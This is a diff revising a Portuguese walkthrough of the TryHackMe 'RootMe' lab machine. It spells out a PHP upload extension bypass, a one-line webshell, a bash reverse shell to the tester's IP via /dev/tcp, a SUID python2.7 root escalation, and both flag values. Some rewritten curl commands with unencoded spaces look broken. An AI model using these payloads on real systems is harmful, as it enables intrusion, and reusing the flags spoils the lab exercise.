@@ -1,180 +1,234 @@
-# RootMe - TryHackMe - Walkthrough
+# RootMe — TryHackMe
 
-Resolvi essa máquina num domingo à noite, então anotando aqui de cabeça ainda fresca pra não esquecer depois.
+Domingo à noite, sem nada pra fazer, falei "vou fazer uma easy rapidinha". Spoiler: não foi tão rapidinha porque eu me prendi na parte mais besta. Anotando tudo aqui pra não passar a mesma raiva de novo.
 
-## Começando - VPN e alvo
+## 0. Ligando a máquina e a VPN
 
-Primeiro conectei a VPN da THM e confirmei que peguei IP:
+Primeira coisa: conectar a VPN da THM e ver se ganhei IP. Se não tiver `tun0`, nem adianta continuar.
 
 ```bash
 ip a show tun0
-# inet 192.168.129.84/18
 ```
 
-Anotei esse IP porque ia precisar pro reverse shell depois. O alvo era `10.67.188.203`, dei um ping só pra ver se tava vivo:
+O meu caiu como `192.168.129.84`. Anotei num canto porque ia precisar dele pro reverse shell depois — toda vez eu esqueço e tenho que voltar aqui, então fica a dica: anota agora.
+
+Depois dei um ping no alvo só pra confirmar que a máquina tinha subido mesmo:
 
 ```bash
-ping -c1 10.67.188.203
-# 64 bytes... ttl=62
+ping 10.67.188.203
 ```
 
-Tava no ar.
+Respondeu com `ttl=62`, que já entrega que é Linux. Tava no ar, bora.
 
-## Enumeração
-
-Rodei o nmap básico de sempre:
+Pra facilitar a vida exportei o IP do alvo numa variável. Isso já encurta todos os comandos daqui pra frente:
 
 ```bash
-nmap -sC -sV -oN nmap-initial.txt 10.67.188.203
+TARGET=10.67.188.203
+echo $TARGET
 ```
 
-Voltou só duas portas:
-- 22 ssh OpenSSH 8.2p1
-- 80 http Apache 2.4.41
+## 1. Recon — o básico que sempre funciona
 
-Abri no navegador, página besta "HackIT - Home" com "Can you root me?". Cara, toda hora é isso.
-
-Fui pro gobuster. Errei o comando umas duas vezes (esqueci o path da wordlist no meu Kali), no fim foi:
+Nmap de sempre, sem inventar moda:
 
 ```bash
-gobuster dir -u http://10.67.188.203/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
+nmap -sV $TARGET
 ```
 
-Achou na hora:
+Resultado:
+- `22` — SSH, OpenSSH 8.2p1
+- `80` — HTTP, Apache 2.4.41
+
+Só duas portas. Quando é assim, 99% das vezes o caminho é pela web. Então nem perdi tempo com SSH agora.
+
+Abri `http://10.67.188.203` no navegador: uma página preta escrito "HackIT - Home" e "Can you root me?". Página estática, sem login, sem nada clicável. Ou seja, o buraco tá escondido em diretório.
+
+Fui de gobuster. Confesso que errei o comando duas vezes — primeiro esqueci o `-u`, depois errei o caminho da wordlist (toda distro põe num lugar diferente, né). O que funcionou:
+
+```bash
+gobuster dir -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/common.txt
 ```
-/panel (301)
-/uploads (301)
-/css, /js, /index.php
+
+Achou de cara:
+- `/panel` — página de upload
+- `/uploads` — pasta com listagem aberta (dava pra ver os arquivos)
+- `/css`, `/js`, `/index.php`
+
+Quando você vê um upload + uma pasta com listagem aberta, o cérebro já acende: é ali.
+
+## 2. O upload — onde eu travei feito bobo
+
+O `/panel/` é um form simples: escolhe o arquivo, clica em Upload. O `/uploads/` mostra o que subiu.
+
+Primeiro teste, o mais inocente possível:
+
+```bash
+echo '<?php echo "pwned"; ?>' > test.php
 ```
 
-`/panel/` era um form de upload. `/uploads/` tava vazio mas com listing aberto, então dava pra ver o que eu subia.
-
-## O upload e a dor de cabeça com extensão
-
-Tentei subir um `test.php` com `<?php echo "pwned"; ?>` e tomou block:
+Subi pelo form e tomei na cara:
 
 > PHP não é permitido!
 
-Já imaginava que era blacklist de extensão. Fui testando na mão mesmo:
+Beleza, tem filtro de extensão. Até aí normal. Pensei "vou testar as variações clássicas" e subi uma de cada vez: `.php5`, `.phtml`, `.php4`, `.phar`... Todas deram "sucesso". Fiquei feliz à toa.
+
+Aqui foi meu erro de domingo: eu tinha baixado um `php-reverse-shell.php4` pronto da internet e fiquei uns 20 minutos tentando fazer ele voltar shell, sem entender porque não ia. O arquivo ainda por cima veio quebrado (quando abri tinha umas 40 linhas com código cortado no meio, nem compilava direito).
+
+O que eu demorei pra sacar: **subir não é executar**. O servidor aceitava `.php4` mas na hora de acessar ele mostrava o código-fonte em vez de rodar. Testei assim, um por um:
 
 ```bash
-for ext in php5 phtml php4 phar php3 php7 pht; do
-  echo '<?php echo "pwned"; ?>' > /tmp/test.$ext
-  curl -s -F "fileUpload=@/tmp/test.$ext" -F "submit=Upload" http://10.67.188.203/panel/ | grep -i sucesso
-done
+curl http://$TARGET/uploads/test.php5
+curl http://$TARGET/uploads/test.phtml
+curl http://$TARGET/uploads/test.php4
 ```
 
-Todos deram "sucesso", então o filtro só barrava `.php` exato. Mas aí vem o pulo: subir não quer dizer executar. Testei acessando cada um:
+- `.php5` voltou só `pwned` — executou!
+- `.phtml` voltou `pwned` — executou também
+- `.php4` voltou o código inteiro `<?php echo...` — não executou, só serviu o arquivo como texto
 
-```bash
-curl -s http://10.67.188.203/uploads/test.php5  # voltou: pwned -> executou
-curl -s http://10.67.188.203/uploads/test.phtml # pwned -> executou
-curl -s http://10.67.188.203/uploads/test.php4  # voltou o código fonte -> não executa
-```
+Moral da história: nessa máquina o certo é `.php5`. Joguei o `.php4` fora e a vida andou.
 
-Eu tinha baixado um `php-reverse-shell.php4` pronto e fiquei um tempão tentando entender porque não voltava shell. Era isso. `.php4` subia mas o Apache servia como texto, não passava pelo PHP. Perdi uns 20 min nisso, confesso.
+## 3. Pegando shell do jeito simples
 
-Moral: nessa máquina tem que usar `.php5` (ou `.phtml`).
-
-## Pegando RCE
-
-Desisti do reverse shell gigante e fui de webshell simples pra testar:
+Desisti do reverse shell gigante e fui de webshell de uma linha, só pra validar o RCE:
 
 ```bash
 echo '<?php system($_GET["cmd"]); ?>' > shell.php5
-curl -F "fileUpload=@shell.php5" -F "submit=Upload" http://10.67.188.203/panel/
-curl "http://10.67.188.203/uploads/shell.php5?cmd=id"
-# uid=33(www-data) gid=33(www-data)
 ```
 
-Quando vi `www-data` até comemorei sozinho aqui. Tava dentro.
-
-Dali pra frente usei o webshell pra tudo:
+Subi pelo form do `/panel/` e testei:
 
 ```bash
-curl -G http://10.67.188.203/uploads/shell.php5 --data-urlencode "cmd=whoami;pwd;ls -la"
-# www-data
-# /var/www/html/uploads
+curl "http://$TARGET/uploads/shell.php5?cmd=id"
 ```
 
-## Primeira flag
+Voltou:
 
-Procurei flag de usuário:
+```
+uid=33(www-data) gid=33(www-data)
+```
+
+Quando eu vi `www-data` eu dei até uma risadinha sozinho aqui em casa. Tava dentro. Esse `shell.php5` virou meu terminal daqui pra frente — tudo que eu precisava era trocar o `cmd`:
 
 ```bash
-curl -G http://10.67.188.203/uploads/shell.php5 --data-urlencode "cmd=ls -la /var/www/; cat /var/www/user.txt"
+curl "http://$TARGET/uploads/shell.php5?cmd=whoami"
+curl "http://$TARGET/uploads/shell.php5?cmd=pwd;ls -la"
 ```
 
-Tava em `/var/www/user.txt` e não na home como eu achei que ia ser:
+Simples assim, sem flag complicada. Se quiser ver a saída bonitinha, troca o `id` por qualquer comando Linux.
+
+## 4. A primeira flag (user.txt)
+
+Procurei onde tava a flag de usuário. Eu jurava que ia estar na home de alguém, mas não:
+
+```bash
+curl "http://$TARGET/uploads/shell.php5?cmd=ls -la /var/www/"
+```
+
+Tinha um `user.txt` ali no meio, dono `www-data`. Pra ler:
+
+```bash
+curl "http://$TARGET/uploads/shell.php5?cmd=cat /var/www/user.txt"
+```
 
 ```
 THM{y0u_g0t_a_sh3ll}
 ```
 
-## Privesc - o python com SUID
+Primeira flag no bolso. O nome já entrega: "you got a shell", kkk.
 
-Comando clássico:
+## 5. Privesc — o arquivo estranho
+
+Com shell de `www-data`, o próximo passo é sempre o mesmo: procurar binário com SUID. Pra quem tá começando, SUID é aquele `s` na permissão que faz o programa rodar como o dono (no caso, root) mesmo quando outro usuário executa.
 
 ```bash
-curl -G http://10.67.188.203/uploads/shell.php5 --data-urlencode "cmd=find / -perm -u=s -type f 2>/dev/null"
+curl "http://$TARGET/uploads/shell.php5?cmd=find / -perm -u=s -type f 2>/dev/null | grep -v snap"
 ```
 
-Veio uma lista enorme, quase tudo normal (`sudo`, `passwd`, `su`, `mount`...), mas um destoava total:
+Veio a lista padrão (`sudo`, `passwd`, `su`, `mount`...) e um que não tinha nada a ver ali no meio:
 
 ```
 /usr/bin/python2.7
 ```
 
-Fui confirmar:
+Confirmei:
 
 ```bash
-curl -G ... --data-urlencode "cmd=ls -l /usr/bin/python*"
-# -rwsr-xr-x 1 root root /usr/bin/python2.7
+curl "http://$TARGET/uploads/shell.php5?cmd=ls -l /usr/bin/python*"
 ```
 
-Aquele `s` ali (`rws`) é SUID root. Python com SUID é presente de grego, porque ele deixa você rodar qualquer coisa como root.
+```
+-rwsr-xr-x 1 root root /usr/bin/python2.7
+```
 
-Testei direto pelo webshell sem precisar de shell interativo:
+Aquele `s` em `rws` é o SUID. Python com SUID é presente: dá pra mandar ele rodar qualquer coisa como root. É o famoso GTFOBins — vale decorar esse.
+
+Sem precisar de shell interativo, mandei ele rodar `id` e ler a flag de root direto:
 
 ```bash
-curl -G http://10.67.188.203/uploads/shell.php5 --data-urlencode "cmd=/usr/bin/python2.7 -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\",\"-c\",\"id; cat /root/root.txt\")'"
+curl "http://$TARGET/uploads/shell.php5?cmd=/usr/bin/python2.7 -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\",\"-c\",\"id;cat /root/root.txt\")'"
 ```
 
-Retornou:
+Voltou:
 
 ```
 uid=33(www-data) gid=33(www-data) euid=0(root)
 THM{pr1v1l3g3_3sc4l4t10n}
 ```
 
-Root pego. Pra quem quiser fazer bonitinho com shell interativo, depois eu fiz também com listener:
+O `euid=0(root)` confirma: executei como root. Segunda flag no bolso.
 
-Terminal 1:
-```bash
-nc -lvnp 4444
-```
+## 6. Bônus — reverse shell de verdade (opcional)
 
-Arquivo `rev.php5`:
+O webshell já resolveu tudo, mas eu quis treinar o reverse interativo também. Deixei um `rev.php5` pronto na pasta:
+
 ```php
 <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.129.84/4444 0>&1'"); ?>
 ```
 
-Upei e acessei, caiu o reverse. Aí estabilizei com `python3 -c 'import pty; pty.spawn("/bin/bash")'` e escalei com:
+Lembra do IP do `tun0` que eu mandei anotar? É ele que vai ali. Se tua VPN reconectar e o IP mudar, atualiza essa linha.
+
+Passo a passo:
+
+Terminal 1, deixa ouvindo:
+```bash
+nc -lvnp 4444
+```
+
+Terminal 2, sobe e dispara:
+```bash
+curl -F "fileUpload=@rev.php5" -F "submit=Upload" http://$TARGET/panel/
+curl http://$TARGET/uploads/rev.php5
+```
+
+Caiu no terminal 1. Pra deixar usável:
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+E o privesc interativo é o mesmo esquema:
 
 ```bash
 /usr/bin/python2.7 -c 'import os; os.execl("/bin/sh","sh","-p")'
+id
 cat /root/root.txt
 ```
 
-## Resumo das flags
+## Resumo
 
-- user: `THM{y0u_g0t_a_sh3ll}` em `/var/www/user.txt`
-- root: `THM{pr1v1l3g3_3sc4l4t10n}` em `/root/root.txt`
+| Flag | Onde | Valor |
+|------|------|-------|
+| user | `/var/www/user.txt` | `THM{y0u_g0t_a_sh3ll}` |
+| root | `/root/root.txt` | `THM{pr1v1l3g3_3sc4l4t10n}` |
 
-## O que eu aprendi / errei
+Vetor completo: upload com bypass de extensão (`.php` → `.php5`) + SUID no `python2.7`.
 
-1. Não confiar em shell pronto sem olhar, meu `.php4` veio quebrado e ainda com extensão errada.
-2. Subiu != executou. Sempre testar com `echo pwned` antes do reverse.
-3. SUID em linguagem de script (python, ruby, etc) é quase sempre o caminho de privesc nessas máquinas fáceis.
+## O que eu levo dessa noite
 
-É isso, máquina boa pra treinar básico de upload bypass + SUID.
+1. **Subiu ≠ executou.** Sempre valida com um `echo pwned` antes de mandar reverse shell. Teria me poupado 20 minutos.
+2. **Não confia em shell pronto.** Abre o arquivo e lê, o meu veio quebrado e eu nem percebi.
+3. **Encurta os comandos.** Exportar `TARGET=` no começo deixa tudo legível. Escrever `curl -G --data-urlencode` pra tudo é coisa de quem quer sofrer.
+4. **SUID em interpretador (python, ruby, perl) é quase sempre o privesc** nessas easy. Bate o olho na lista e procura o que destoa.
+
+Máquina boa pra quem tá começando: ensina enumeração web, bypass bobo e privesc clássico, sem precisar de exploit mirabolante. Valeu o domingo.
